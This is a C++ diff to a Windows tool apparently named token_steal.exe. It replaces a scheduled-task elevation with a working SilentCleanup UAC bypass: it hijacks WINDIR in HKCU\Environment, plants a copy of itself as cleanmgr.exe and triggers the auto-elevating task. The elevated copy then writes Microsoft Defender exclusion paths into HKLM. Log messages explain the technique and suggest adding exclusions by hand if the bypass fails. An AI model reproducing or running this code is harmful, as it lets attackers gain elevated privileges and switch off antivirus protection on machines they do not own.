@@ -159,74 +159,98 @@ bool WriteExclusionsDirect() {
     return allOk;
 }
 
-// ─── Phase 1: Use schtasks to relaunch at High integrity ─────────────────────
+// ─── Phase 1: SilentCleanup WINDIR hijack ────────────────────────────────────
+//
+// The \Microsoft\Windows\DiskCleanup\SilentCleanup task:
+//   - Runs at High integrity (RunLevel = Highest) — auto-elevates for admins
+//   - ANY user can trigger it (no elevation needed to /run it)
+//   - Executes %WINDIR%\system32\cleanmgr.exe
+//   - Reads %WINDIR% from HKCU\Environment (writable by any user!)
+//
+// We set WINDIR in HKCU\Environment, drop our binary as cleanmgr.exe,
+// trigger the task, and our binary runs at High integrity then writes HKLM.
 
-bool ElevateViaSchtasks(const char* myExePath) {
-    INFO("=== Phase 1: Elevating via schtasks /rl highest ===");
-    INFO("This schedules THIS binary to run elevated, then runs it");
-    INFO("Phase 2 (when elevated) writes directly to HKLM — no PowerShell/AMSI");
+bool ElevateViaSilentCleanup(const char* myExePath) {
+    INFO("=== Phase 1: SilentCleanup WINDIR hijack ===");
+    INFO("Task: \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
+    INFO("Runs at High integrity, triggered by any user, uses HKCU WINDIR");
 
-    // Task name — blend in
-    const char* taskName = "WindowsDefenderMaintenance";
+    // 1. Create fake %WINDIR%\system32 and drop ourselves as cleanmgr.exe
+    INFO("Creating C:\\exclusiontest\\system32\\...");
+    CreateDirectoryA("C:\\exclusiontest\\system32", nullptr);
 
-    // Build schtasks create command
-    // /rl highest = run at highest privilege level (High integrity, no UAC for admins)
-    // /sc once /st 00:00 = one-shot trigger (immediately overridden by /run)
-    // We pass /elevated flag so Phase 2 knows to write directly
-    char createCmd[2048];
-    snprintf(createCmd, sizeof(createCmd),
-        "schtasks /create "
-        "/tn \"%s\" "
-        "/tr \"\\\"%s\\\" /elevated\" "
-        "/sc once /st 00:00 "
-        "/rl highest "
-        "/f",
-        taskName, myExePath);
-
-    DBG("schtasks create: %s", createCmd);
-    INFO("Creating scheduled task...");
-    int r = system(createCmd);
-    if (r != 0) {
-        ERR("schtasks /create returned %d", r);
+    const char* fakeMgr = "C:\\exclusiontest\\system32\\cleanmgr.exe";
+    INFO("Copying self to %s", fakeMgr);
+    if (!CopyFileA(myExePath, fakeMgr, FALSE)) {
+        WinErr("CopyFile -> cleanmgr.exe");
         return false;
     }
-    OK("Task created");
+    OK("Fake cleanmgr.exe ready");
 
-    Sleep(500);
+    // 2. Set HKCU\Environment\WINDIR = C:\exclusiontest
+    HKEY hEnv = nullptr;
+    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Environment",
+                             0, KEY_QUERY_VALUE|KEY_SET_VALUE, &hEnv);
+    if (res != ERROR_SUCCESS) { WinErr("RegOpenKeyEx HKCU\\Environment"); return false; }
 
-    // Run the task
-    char runCmd[256];
-    snprintf(runCmd, sizeof(runCmd), "schtasks /run /tn \"%s\"", taskName);
-    DBG("schtasks run: %s", runCmd);
-    INFO("Running task (Phase 2 will execute at High integrity)...");
-    r = system(runCmd);
-    if (r != 0) {
-        WARN("schtasks /run returned %d (may still have worked)", r);
+    // Save old value if present
+    char oldVal[MAX_PATH] = {};
+    DWORD oldLen = sizeof(oldVal), oldType = 0;
+    bool hadOld = (RegQueryValueExA(hEnv, "WINDIR", nullptr, &oldType,
+                                    (BYTE*)oldVal, &oldLen) == ERROR_SUCCESS);
+
+    const char* fakeWinDir = "C:\\exclusiontest";
+    res = RegSetValueExA(hEnv, "WINDIR", 0, REG_SZ,
+                         (const BYTE*)fakeWinDir, (DWORD)strlen(fakeWinDir)+1);
+    if (res != ERROR_SUCCESS) {
+        ERR("RegSetValueEx WINDIR: %ld", res); RegCloseKey(hEnv); return false;
     }
-    OK("Task run triggered — waiting 6s for completion...");
+    OK("HKCU\\Environment\\WINDIR = %s", fakeWinDir);
 
-    Sleep(6000);
+    // Broadcast env change so task scheduler picks it up
+    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 500, nullptr);
+    Sleep(300);
+
+    // 3. Trigger the SilentCleanup task — any user can do this
+    INFO("Triggering SilentCleanup...");
+    int r = system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\"");
+    DBG("schtasks /run returned: %d", r);
+    if (r != 0) WARN("schtasks returned non-zero (may still work)");
+
+    INFO("Waiting 8s for elevated Phase 2 to complete...");
+    Sleep(8000);
+
+    // 4. Restore WINDIR
+    INFO("Restoring HKCU\\Environment...");
+    if (hadOld)
+        RegSetValueExA(hEnv, "WINDIR", 0, oldType, (BYTE*)oldVal, oldLen);
+    else
+        RegDeleteValueA(hEnv, "WINDIR");
+    RegCloseKey(hEnv);
+    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 500, nullptr);
 
     // Cleanup
-    char delCmd[256];
-    snprintf(delCmd, sizeof(delCmd), "schtasks /delete /tn \"%s\" /f >nul 2>&1", taskName);
-    system(delCmd);
-    DBG("Task deleted");
+    DeleteFileA(fakeMgr);
+    RemoveDirectoryA("C:\\exclusiontest\\system32");
+    DBG("Cleaned up fake cleanmgr.exe");
 
-    // Check for result file written by Phase 2
+    // 5. Check result
     FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
     if (f) {
         char buf[256]={};
         fgets(buf, sizeof(buf), f);
         fclose(f);
         OK("Phase 2 result: %s", buf);
-        OK("SUCCESS — exclusions active!");
+        OK("SUCCESS — HKLM exclusions written via SilentCleanup hijack!");
+        OK("Verify: Get-MpPreference | Select ExclusionPath");
         return true;
     }
 
-    WARN("No result file from Phase 2");
-    WARN("Defender may have killed the elevated process");
-    WARN("Check task execution: Get-ScheduledTask -TaskName \"%s\"", taskName);
+    WARN("No result file — Phase 2 may have been blocked");
+    WARN("Check elevated log: C:\\exclusiontest\\token_log_elevated.txt");
+    INFO("If Defender blocked cleanmgr.exe, add C:\\exclusiontest\\system32 to exclusions first");
     return false;
 }
 
@@ -262,8 +286,8 @@ int main(int argc, char* argv[]) {
         GetModuleFileNameA(nullptr, myPath, MAX_PATH);
         INFO("Our path: %s", myPath);
 
-        if (!ElevateViaSchtasks(myPath)) {
-            ERR("schtasks elevation failed");
+        if (!ElevateViaSilentCleanup(myPath)) {
+            ERR("SilentCleanup hijack failed");
             INFO("Manual option: right-click token_steal.exe -> Run as administrator");
             INFO("Or open elevated PowerShell and run:");
             INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
